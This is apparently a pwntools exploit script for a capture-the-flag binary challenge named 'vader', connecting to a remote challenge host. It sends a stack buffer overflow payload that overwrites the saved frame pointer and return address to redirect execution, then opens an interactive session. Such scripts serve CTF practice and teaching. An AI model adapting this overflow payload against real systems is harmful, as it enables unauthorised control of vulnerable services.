from pwn import *

context(terminal=['tmux','new-window'])

fname = './vader'
local = False

p = ELF(fname)

host, port = '0.cloud.chals.io', 20712

r = process(fname) if local else remote(host, port)

def title():
	r.recvuntil('>>> ')

if __name__ == '__main__':

	title()
	#gdb.attach(r)
	vader_fgets = 0x0000000000401545
	r.sendline(b'b'*32+p64(p.sym['__bss_start'])+p64(vader_fgets))
	r.interactive()
	










